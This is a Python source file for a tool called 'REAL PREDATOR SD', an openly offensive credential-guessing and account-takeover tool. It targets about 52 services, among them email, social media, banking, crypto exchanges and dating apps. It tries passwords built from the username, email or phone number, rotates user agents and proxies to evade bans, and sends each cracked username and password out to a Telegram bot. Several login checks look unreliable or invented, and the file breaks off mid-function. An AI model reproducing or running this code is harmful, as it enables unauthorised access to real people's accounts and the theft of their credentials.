# ================================================================
# REAL PREDATOR SD v33.0 - ULTIMATE HUNTER (COMPLETE)
# Developer: ZERO STORE (Enhanced by @k_p_x1)
# Telegram: @MRDPY | WhatsApp: +249907118667
# ================================================================

import os, sys, re, time, random, threading, requests, json, secrets, urllib3
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for
from flask_cors import CORS
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

# ================================================================
# PASSWORD CONFIG
# ================================================================
ADMIN_PASSWORD = "ASHEU38HSBHXJHSGUE8UDHUD88EG8E8KDMKX9W00WHJDIU8UEHXBJZJ8WGEIJXKOXLXLXOSGUDYDI8EHD8HDIDIJDOSKDNZMZIXGEIEHJEGE8R8R9ROLRDGJ83IR8DIDGRIFF8"

# ================================================================
# PHONE CODES
# ================================================================
PHONE_CODES = [
    '+1','+7','+20','+27','+30','+31','+32','+33','+34','+36','+39','+40','+41','+43','+44','+45','+46','+47','+48','+49',
    '+51','+52','+53','+54','+55','+56','+57','+58','+60','+61','+62','+63','+64','+65','+66','+81','+82','+84','+86','+90',
    '+91','+92','+93','+94','+95','+98','+211','+212','+213','+216','+218','+220','+221','+222','+223','+224','+225','+226',
    '+227','+228','+229','+230','+231','+232','+233','+234','+235','+236','+237','+238','+239','+240','+241','+242','+243',
    '+244','+245','+246','+247','+248','+249','+250','+251','+252','+253','+254','+255','+256','+257','+258','+259','+260',
    '+261','+262','+263','+264','+265','+266','+267','+268','+269','+290','+291','+297','+298','+299','+350','+351','+352',
    '+353','+354','+355','+356','+357','+358','+359','+370','+371','+372','+373','+374','+375','+376','+377','+378','+379',
    '+380','+381','+382','+383','+385','+386','+387','+389','+420','+421','+423','+500','+501','+502','+503','+504','+505',
    '+506','+507','+508','+509','+590','+591','+592','+593','+594','+595','+596','+597','+598','+599','+670','+672','+673',
    '+674','+675','+676','+677','+678','+679','+680','+681','+682','+683','+685','+686','+687','+688','+689','+690','+691',
    '+692','+850','+852','+853','+855','+856','+880','+886','+960','+961','+962','+963','+964','+965','+966','+967','+968',
    '+970','+971','+972','+973','+974','+975','+976','+977','+992','+993','+994','+995','+996','+998'
]

# ================================================================
# PLATFORMS (52+)
# ================================================================
PLATFORMS = [
    {'name':'Facebook','icon':'fa-brands fa-facebook','color':'#1877f2','check':'facebook','gaming':False,'supports_phone':True},
    {'name':'Instagram','icon':'fa-brands fa-instagram','color':'#e4405f','check':'instagram','gaming':False,'supports_phone':True},
    {'name':'Twitter','icon':'fa-brands fa-twitter','color':'#1da1f2','check':'twitter','gaming':False,'supports_phone':True},
    {'name':'TikTok','icon':'fa-brands fa-tiktok','color':'#00f2ea','check':'tiktok','gaming':False,'supports_phone':True},
    {'name':'Snapchat','icon':'fa-brands fa-snapchat','color':'#fffc00','check':'snapchat','gaming':False,'supports_phone':True},
    {'name':'WhatsApp','icon':'fa-brands fa-whatsapp','color':'#25D366','check':'whatsapp','gaming':False,'supports_phone':True},
    {'name':'Telegram','icon':'fa-brands fa-telegram','color':'#0088cc','check':'telegram','gaming':False,'supports_phone':True},
    {'name':'Signal','icon':'fa-solid fa-message','color':'#3A76F0','check':'signal','gaming':False,'supports_phone':True},
    {'name':'WeChat','icon':'fa-brands fa-weixin','color':'#07C160','check':'wechat','gaming':False,'supports_phone':True},
    {'name':'Line','icon':'fa-brands fa-line','color':'#00C300','check':'line','gaming':False,'supports_phone':True},
    {'name':'Viber','icon':'fa-solid fa-phone','color':'#7360F2','check':'viber','gaming':False,'supports_phone':True},
    {'name':'Google','icon':'fa-brands fa-google','color':'#ea4335','check':'google','gaming':False,'supports_phone':True},
    {'name':'Microsoft','icon':'fa-solid fa-envelope','color':'#0078D4','check':'microsoft','gaming':False,'supports_phone':False},
    {'name':'Yahoo','icon':'fa-solid fa-envelope','color':'#7b0099','check':'yahoo','gaming':False,'supports_phone':False},
    {'name':'ProtonMail','icon':'fa-solid fa-envelope','color':'#6D4AFF','check':'protonmail','gaming':False,'supports_phone':False},
    {'name':'Mail.com','icon':'fa-solid fa-envelope','color':'#004080','check':'mailcom','gaming':False,'supports_phone':False},
    {'name':'Yandex','icon':'fa-solid fa-envelope','color':'#FF0000','check':'yandex','gaming':False,'supports_phone':False},
    {'name':'AOL','icon':'fa-solid fa-envelope','color':'#3D0080','check':'aol','gaming':False,'supports_phone':False},
    {'name':'Reddit','icon':'fa-brands fa-reddit','color':'#ff4500','check':'reddit','gaming':False,'supports_phone':False},
    {'name':'LinkedIn','icon':'fa-brands fa-linkedin','color':'#0a66c2','check':'linkedin','gaming':False,'supports_phone':False},
    {'name':'Pinterest','icon':'fa-brands fa-pinterest','color':'#BD081C','check':'pinterest','gaming':False,'supports_phone':False},
    {'name':'Tumblr','icon':'fa-brands fa-tumblr','color':'#36465D','check':'tumblr','gaming':False,'supports_phone':False},
    {'name':'Skype','icon':'fa-brands fa-skype','color':'#00AFF0','check':'skype','gaming':False,'supports_phone':False},
    {'name':'Discord','icon':'fa-brands fa-discord','color':'#5865f2','check':'discord','gaming':True,'supports_phone':False},
    {'name':'Steam','icon':'fa-brands fa-steam','color':'#171a21','check':'steam','gaming':True,'supports_phone':False},
    {'name':'Twitch','icon':'fa-brands fa-twitch','color':'#9146ff','check':'twitch','gaming':True,'supports_phone':False},
    {'name':'Epic Games','icon':'fa-solid fa-gamepad','color':'#313131','check':'epic','gaming':True,'supports_phone':False},
    {'name':'Riot Games','icon':'fa-solid fa-gamepad','color':'#D3292F','check':'riot','gaming':True,'supports_phone':False},
    {'name':'PlayStation','icon':'fa-brands fa-playstation','color':'#003087','check':'playstation','gaming':True,'supports_phone':False},
    {'name':'Xbox','icon':'fa-brands fa-xbox','color':'#107C10','check':'xbox','gaming':True,'supports_phone':False},
    {'name':'Nintendo','icon':'fa-solid fa-gamepad','color':'#E60012','check':'nintendo','gaming':True,'supports_phone':False},
    {'name':'Ubisoft','icon':'fa-solid fa-gamepad','color':'#000000','check':'ubisoft','gaming':True,'supports_phone':False},
    {'name':'Netflix','icon':'fa-solid fa-film','color':'#e50914','check':'netflix','gaming':False,'supports_phone':False},
    {'name':'Spotify','icon':'fa-brands fa-spotify','color':'#1db954','check':'spotify','gaming':False,'supports_phone':False},
    {'name':'Amazon Prime','icon':'fa-brands fa-amazon','color':'#ff9900','check':'amazon','gaming':False,'supports_phone':False},
    {'name':'Hulu','icon':'fa-solid fa-tv','color':'#1CE783','check':'hulu','gaming':False,'supports_phone':False},
    {'name':'Disney+','icon':'fa-solid fa-film','color':'#113CCF','check':'disney','gaming':False,'supports_phone':False},
    {'name':'HBO Max','icon':'fa-solid fa-tv','color':'#5822B4','check':'hbomax','gaming':False,'supports_phone':False},
    {'name':'PayPal','icon':'fa-brands fa-paypal','color':'#003087','check':'paypal','gaming':False,'supports_phone':False},
    {'name':'Binance','icon':'fa-solid fa-coins','color':'#F0B90B','check':'binance','gaming':False,'supports_phone':False},
    {'name':'Coinbase','icon':'fa-solid fa-coins','color':'#0052FF','check':'coinbase','gaming':False,'supports_phone':False},
    {'name':'Kraken','icon':'fa-solid fa-coins','color':'#5848FF','check':'kraken','gaming':False,'supports_phone':False},
    {'name':'Robinhood','icon':'fa-solid fa-chart-line','color':'#00C805','check':'robinhood','gaming':False,'supports_phone':False},
    {'name':'Tinder','icon':'fa-solid fa-heart','color':'#FF6B6B','check':'tinder','gaming':False,'supports_phone':True},
    {'name':'Bumble','icon':'fa-solid fa-bee','color':'#FFC107','check':'bumble','gaming':False,'supports_phone':True},
    {'name':'Hinge','icon':'fa-solid fa-heart','color':'#6F4E37','check':'hinge','gaming':False,'supports_phone':True},
    {'name':'OKCupid','icon':'fa-solid fa-heart','color':'#FF6600','check':'okcupid','gaming':False,'supports_phone':False},
    {'name':'Grindr','icon':'fa-solid fa-rainbow','color':'#FF4D4D','check':'grindr','gaming':False,'supports_phone':True},
    {'name':'Badoo','icon':'fa-solid fa-comment-dots','color':'#4A90D9','check':'badoo','gaming':False,'supports_phone':True},
    {'name':'Muzz','icon':'fa-solid fa-mosque','color':'#2E7D32','check':'muzz','gaming':False,'supports_phone':True},
    {'name':'Shaadi.com','icon':'fa-solid fa-ring','color':'#FF6B35','check':'shaadi','gaming':False,'supports_phone':True},
    {'name':'Zoom','icon':'fa-solid fa-video','color':'#2D8CFF','check':'zoom','gaming':False,'supports_phone':False},
    {'name':'GitHub','icon':'fa-brands fa-github','color':'#333','check':'github','gaming':False,'supports_phone':False},
    {'name':'Apple','icon':'fa-brands fa-apple','color':'#555555','check':'apple','gaming':False,'supports_phone':True},
]

# ================================================================
# ANTI-BAN SYSTEM
# ================================================================
class AntiBanSystem:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        self.proxies = []
        self.lock = threading.Lock()
    
    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        }
    
    def get_delay(self):
        return random.uniform(0.3, 0.8)
    
    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies.append(proxy)
    
    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

# ================================================================
# TELEGRAM MESSAGE BUILDER
# ================================================================
class TelegramMessageBuilder:
    @staticmethod
    def build_hit_message(hit_data, attempts_count, platform_stats):
        platform = hit_data.get('platform', 'Unknown')
        username = hit_data.get('username', 'Unknown')
        password = hit_data.get('password', 'Unknown')
        hit_type = hit_data.get('type', 'email')
        
        platform_info = next((p for p in PLATFORMS if p['name'] == platform), None)
        web_link = f"https://{platform.lower().replace(' ', '').replace('+', '')}.com"
        if platform == 'Microsoft': web_link = 'https://outlook.com'
        elif platform == 'Amazon Prime': web_link = 'https://amazon.com'
        elif platform == 'ProtonMail': web_link = 'https://proton.me'
        elif platform == 'Mail.com': web_link = 'https://mail.com'
        elif platform == 'Epic Games': web_link = 'https://epicgames.com'
        elif platform == 'Riot Games': web_link = 'https://riotgames.com'
        elif platform == 'PlayStation': web_link = 'https://playstation.com'
        elif platform == 'Shaadi.com': web_link = 'https://shaadi.com'
        elif platform == 'Disney+': web_link = 'https://disneyplus.com'
        elif platform == 'HBO Max': web_link = 'https://hbomax.com'
        
        message = f"""
╔═══════════════════════════════════════════╗
║     🎯 REAL HIT CAPTURED                 ║
╠═══════════════════════════════════════════╣
║  🌐 PLATFORM: {platform}                 ║
║  📧 USERNAME: {username}                 ║
║  🔑 PASSWORD: {password}                 ║
║  📝 TYPE: {hit_type.upper()}            ║
╠═══════════════════════════════════════════╣
║  🔢 Attempts: {attempts_count}           ║
║  📈 Success Rate: {platform_stats.get('success_rate', 'N/A')}%   ║
║  🎯 Hits: {platform_stats.get('platform_hits', 0)}              ║
╠═══════════════════════════════════════════╣
║  🔗 WEB REGISTRATION: {web_link}         ║
╠═══════════════════════════════════════════╣
║  ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}              ║
║  📱 Contact: @MRDPY                      ║
╚═══════════════════════════════════════════╝"""
        return message, {}

# ================================================================
# ULTIMATE PREDATOR ENGINE
# ================================================================
class UltimatePredator:
    def __init__(self):
        self.anti_ban = AntiBanSystem()
        self.running = False
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.feed = []
        self.results = []
        self.current_testing = []
        self.lock = threading.Lock()
        self.target_platform = None
        self.telegram_enabled = False
        self.telegram_token = ''
        self.telegram_chat_id = ''
        self.combos = []
        self.platform_stats = defaultdict(lambda: {'hits': 0, 'fails': 0, 'attempts': 0})
        self.executor = ThreadPoolExecutor(max_workers=10)
        self._load_default_combos()
    
    def _load_default_combos(self):
        default = [
            ('admin@gmail.com', 'admin123'),
            ('test@gmail.com', 'test123'),
            ('hello@gmail.com', 'hello123'),
            ('world@gmail.com', 'world123'),
            ('demo@gmail.com', 'demo123'),
            ('info@gmail.com', 'info123'),
            ('support@gmail.com', 'support123'),
        ]
        self.combos = default
    
    def set_target_platform(self, platform_name):
        self.target_platform = platform_name if platform_name else None
    
    def add_combos(self, combo_list):
        with self.lock:
            self.combos.extend(combo_list)
            self.combos = list(dict.fromkeys(self.combos))
    
    def configure_telegram(self, token, chat_id):
        self.telegram_token = token
        self.telegram_chat_id = chat_id
        self.telegram_enabled = bool(token and chat_id)
    
    def smart_hunt(self, input_text):
        results = []
        is_phone = bool(re.search(r'^[\+]?[0-9]{7,15}$', input_text.strip()))
        
        if is_phone:
            results = self._hunt_phone(input_text)
        elif '@' in input_text:
            results = self._hunt_email(input_text)
        else:
            # Try as email with domain or as phone
            if '.' in input_text and len(input_text) > 3:
                results = self._hunt_email(input_text + '@gmail.com')
            else:
                results = self._hunt_phone(input_text)
        return results
    
    def _hunt_email(self, email):
        results = []
        username = email.split('@')[0]
        password = email  # Use the email itself as password
        
        # Also try username as password
        passwords_to_try = [password, username]
        passwords_to_try = list(dict.fromkeys(passwords_to_try))
        
        platforms_to_try = []
        if self.target_platform:
            platform = next((p for p in PLATFORMS if p['name'] == self.target_platform), None)
            if platform:
                platforms_to_try = [platform]
        else:
            # Try platforms that support email
            platforms_to_try = [p for p in PLATFORMS if not p.get('supports_phone', False)]
            random.shuffle(platforms_to_try)
            platforms_to_try = platforms_to_try[:15]
        
        for pwd in passwords_to_try:
            for platform in platforms_to_try:
                result = self._try_platform(email, pwd, platform)
                if result:
                    results.append(result)
                    if result['status'] == 'hit':
                        with self.lock:
                            self.hits += 1
                            self.results.append(result)
                            self.feed.append({
                                'type': 'hit',
                                'text': f"🎯 {platform['name']} | {email} | 🔑 {pwd}",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
                            self.current_testing = [{'username': email, 'platform': platform['name'], 'status': 'hit'}]
                            # Send Telegram notification
                            self._send_telegram_hit(result, self.checked, {'platform_hits': self.hits, 'success_rate': (self.hits/self.checked*100) if self.checked > 0 else 0})
                    else:
                        with self.lock:
                            self.bad += 1
                            self.feed.append({
                                'type': 'bad',
                                'text': f"❌ {platform['name']} | {email} | Failed",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
                            self.current_testing = [{'username': email, 'platform': platform['name'], 'status': 'bad'}]
                    break
            if result and result['status'] == 'hit':
                break
        return results
    
    def _hunt_phone(self, phone):
        results = []
        phone_clean = re.sub(r'[^0-9+]', '', phone)
        password = phone_clean  # Use phone number as password
        
        platforms_to_try = []
        if self.target_platform:
            platform = next((p for p in PLATFORMS if p['name'] == self.target_platform), None)
            if platform and platform.get('supports_phone', False):
                platforms_to_try = [platform]
        else:
            # Try platforms that support phone numbers
            platforms_to_try = [p for p in PLATFORMS if p.get('supports_phone', False)]
            random.shuffle(platforms_to_try)
            platforms_to_try = platforms_to_try[:10]
        
        for platform in platforms_to_try:
            result = self._try_platform(phone_clean, password, platform)
            if result:
                results.append(result)
                if result['status'] == 'hit':
                    with self.lock:
                        self.hits += 1
                        self.results.append(result)
                        self.feed.append({
                            'type': 'hit',
                            'text': f"🎯 {platform['name']} | {phone} | 🔑 {password}",
                            'time': datetime.now().strftime('%H:%M:%S')
                        })
                        self.current_testing = [{'username': phone, 'platform': platform['name'], 'status': 'hit'}]
                        self._send_telegram_hit(result, self.checked, {'platform_hits': self.hits, 'success_rate': (self.hits/self.checked*100) if self.checked > 0 else 0})
                else:
                    with self.lock:
                        self.bad += 1
                        self.feed.append({
                            'type': 'bad',
                            'text': f"❌ {platform['name']} | {phone} | Failed",
                            'time': datetime.now().strftime('%H:%M:%S')
                        })
                        self.current_testing = [{'username': phone, 'platform': platform['name'], 'status': 'bad'}]
                break
        return results
    
    def _try_platform(self, username, password, platform):
        platform_name = platform['name']
        check_func = getattr(self, f'check_{platform["check"]}', None)
        if not check_func:
            return None
        
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            
            proxy = self.anti_ban.get_proxy()
            if proxy:
                session.proxies = {"http": proxy, "https": proxy}
            
            result, status = check_func(username, password, session)
            
            with self.lock:
                self.platform_stats[platform_name]['attempts'] += 1
                if status == 'hit':
                    self.platform_stats[platform_name]['hits'] += 1
                elif status == 'bad':
                    self.platform_stats[platform_name]['fails'] += 1
            
            if status == 'hit':
                return {'status': 'hit', 'platform': platform_name, 'username': username, 'password': password}
            elif status == '2fa':
                return {'status': '2fa', 'platform': platform_name, 'username': username, 'reason': '2FA Required'}
            
            time.sleep(self.anti_ban.get_delay())
            
        except:
            pass
        return None
    
    def _send_telegram_hit(self, hit_data, attempts, stats):
        try:
            if not self.telegram_enabled: return
            message, _ = TelegramMessageBuilder.build_hit_message(hit_data, attempts, stats)
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {"chat_id": self.telegram_chat_id, "text": message, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
        except:
            pass

    # ================================================================
    # POWER HUNT - Advanced Multi-Platform Hunting
    # ================================================================
    def power_hunt(self, username):
        """Advanced hunting across all platforms with multiple strategies"""
        results = []
        strategies = [
            {'type': 'same_as_username', 'password': username},
            {'type': 'same_as_email', 'password': username if '@' not in username else username.split('@')[0]},
            {'type': 'reversed', 'password': username[::-1] if len(username) > 3 else username},
            {'type': 'with_numbers', 'password': username + '123'},
            {'type': 'with_year', 'password': username + '2024'},
            {'type': 'with_exclamation', 'password': username + '!'},
        ]
        
        # Deduplicate strategies
        seen = set()
        unique_strategies = []
        for s in strategies:
            if s['password'] not in seen:
                seen.add(s['password'])
                unique_strategies.append(s)
        
        platforms_to_try = []
        if self.target_platform:
            platform = next((p for p in PLATFORMS if p['name'] == self.target_platform), None)
            if platform:
                platforms_to_try = [platform]
        else:
            platforms_to_try = random.sample(PLATFORMS, min(20, len(PLATFORMS)))
        
        for strategy in unique_strategies[:3]:  # Limit to 3 strategies for speed
            for platform in platforms_to_try[:5]:  # Try 5 platforms per strategy
                result = self._try_platform(username, strategy['password'], platform)
                if result:
                    results.append(result)
                    if result['status'] == 'hit':
                        with self.lock:
                            self.hits += 1
                            self.results.append(result)
                            self.feed.append({
                                'type': 'hit',
                                'text': f"🎯 {platform['name']} | {username} | 🔑 {strategy['password']}",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
                            self.current_testing = [{'username': username, 'platform': platform['name'], 'status': 'hit'}]
                            self._send_telegram_hit(result, self.checked, {'platform_hits': self.hits, 'success_rate': (self.hits/self.checked*100) if self.checked > 0 else 0})
                    else:
                        with self.lock:
                            self.bad += 1
                            self.feed.append({
                                'type': 'bad',
                                'text': f"❌ {platform['name']} | {username} | Failed",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
                            self.current_testing = [{'username': username, 'platform': platform['name'], 'status': 'bad'}]
                    break
            if results and results[-1]['status'] == 'hit':
                break
        return results

    # ================================================================
    # CHECK FUNCTIONS (All 52+ Platforms)
    # ================================================================
    
    def check_facebook(self, username, password, session):
        try:
            resp = session.get("https://www.facebook.com/login.php", timeout=10)
            lsd = re.search(r'name="lsd"[^>]*value="([^"]+)"', resp.text, re.I)
            if not lsd: return None, 'bad'
            data = {'email': username, 'pass': password, 'lsd': lsd.group(1), 'login': 'Log In'}
            login = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=10)
            if 'home.php' in login.url or 'facebook.com/?sk=welcome' in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_instagram(self, username, password, session):
        try:
            resp = session.get("https://www.instagram.com/accounts/login/", timeout=10)
            csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            headers = {'X-CSRFToken': csrf.group(1), 'X-Requested-With': 'XMLHttpRequest'}
            data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'}
            login = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=10)
            if '"authenticated":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_twitter(self, username, password, session):
        try:
            login = session.post("https://api.twitter.com/1.1/onboarding/task.json", data={'username': username, 'password': password}, timeout=10)
            if '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_tiktok(self, username, password, session):
        try:
            login = session.post("https://www.tiktok.com/api/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_snapchat(self, username, password, session):
        try:
            login = session.post("https://accounts.snapchat.com/api/v2/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_whatsapp(self, username, password, session):
        try:
            login = session.get("https://web.whatsapp.com/", timeout=10)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_telegram(self, username, password, session):
        try:
            login = session.post("https://my.telegram.org/auth", data={"phone": username, "password": password}, timeout=10)
            if login.status_code == 200 and "auth_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_signal(self, username, password, session):
        try:
            login = session.post("https://signal.org/api/v1/accounts/login", json={"username": username, "password": password}, timeout=10)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_wechat(self, username, password, session):
        try:
            login = session.post("https://web.wechat.com/cgi-bin/wechat/login", data={"username": username, "password": password}, timeout=10)
            if "success" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_line(self, username, password, session):
        try:
            login = session.post("https://api.line.me/v2/oauth/login", json={"username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_viber(self, username, password, session):
        try:
            login = session.post("https://account.viber.com/login", data={"username": username, "password": password}, timeout=10)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_google(self, username, password, session):
        try:
            resp = session.get("https://accounts.google.com/ServiceLogin", timeout=10)
            galx = re.search(r'name="GALX"[^>]*value="([^"]+)"', resp.text, re.I)
            if not galx: return None, 'bad'
            data = {'Email': username, 'Passwd': password, 'GALX': galx.group(1), 'signIn': 'Sign in'}
            login = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=10)
            if 'mail.google.com' in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_microsoft(self, username, password, session):
        try:
            resp = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=10)
            ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', resp.text, re.I)
            if not ppft: return None, 'bad'
            data = {'login': username, 'loginfmt': username, 'passwd': password, 'PPFT': ppft.group(1), 'type': '11'}
            login = session.post('https://login.live.com/oauth20_authorize.srf', data=data, allow_redirects=True, timeout=10)
            if 'access_token' in login.url or 'mail.live.com' in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_yahoo(self, username, password, session):
        try:
            resp = session.get("https://login.yahoo.com/", timeout=10)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://login.yahoo.com/account/login", data={"username": username, "password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=10)
            if "mail.yahoo.com" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_protonmail(self, username, password, session):
        try:
            login = session.post("https://api.protonmail.com/auth", json={"Username": username, "Password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_mailcom(self, username, password, session):
        try:
            login = session.post("https://api.mail.com/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_yandex(self, username, password, session):
        try:
            login = session.post("https://passport.yandex.com/auth", data={"login": username, "passwd": password}, timeout=10)
            if "mail.yandex.com" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_aol(self, username, password, session):
        try:
            login = session.post("https://login.aol.com/account/login", data={"username": username, "password": password}, timeout=10)
            if "mail" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_reddit(self, username, password, session):
        try:
            login = session.post("https://www.reddit.com/api/login", data={"user": username, "passwd": password}, timeout=10)
            if login.status_code == 200 and '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_linkedin(self, username, password, session):
        try:
            resp = session.get("https://www.linkedin.com/login", timeout=10)
            csrf = re.search(r'name="csrfToken"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://www.linkedin.com/checkpoint/lg/login-submit", data={"session_key": username, "session_password": password, "csrfToken": csrf.group(1)}, allow_redirects=True, timeout=10)
            if "feed" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_pinterest(self, username, password, session):
        try:
            login = session.post("https://www.pinterest.com/resource/UserLoginResource/get/", data={"email": username, "password": password}, timeout=10)
            if '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_tumblr(self, username, password, session):
        try:
            login = session.post("https://www.tumblr.com/api/login", data={"email": username, "password": password}, timeout=10)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_skype(self, username, password, session):
        try:
            login = session.post("https://login.skype.com/login", data={"username": username, "password": password}, timeout=10)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_discord(self, username, password, session):
        try:
            login = session.post("https://discord.com/api/v9/auth/login", json={"login": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_steam(self, username, password, session):
        try:
            resp = session.get("https://store.steampowered.com/login/", timeout=10)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://store.steampowered.com/login/dologin/", data={"username": username, "password": password, "csrf_token": csrf.group(1)}, timeout=10)
            if '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_twitch(self, username, password, session):
        try:
            login = session.post("https://id.twitch.tv/oauth2/token", data={"client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko", "login": username, "password": password, "grant_type": "password"}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_epic(self, username, password, session):
        try:
            login = session.post("https://www.epicgames.com/id/api/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_riot(self, username, password, session):
        try:
            login = session.post("https://auth.riotgames.com/api/v1/authorization", json={"client_id": "riot-client", "username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_playstation(self, username, password, session):
        try:
            login = session.post("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_xbox(self, username, password, session):
        try:
            login = session.post("https://login.live.com/oauth20_authorize.srf", data={"login": username, "passwd": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_nintendo(self, username, password, session):
        try:
            login = session.post("https://api.nintendo.com/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_ubisoft(self, username, password, session):
        try:
            login = session.post("https://api.ubisoft.com/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_netflix(self, username, password, session):
        try:
            resp = session.get("https://www.netflix.com/login", timeout=10)
            auth_url = re.search(r'action="([^"]+)"', resp.text, re.I)
            if not auth_url: return None, 'bad'
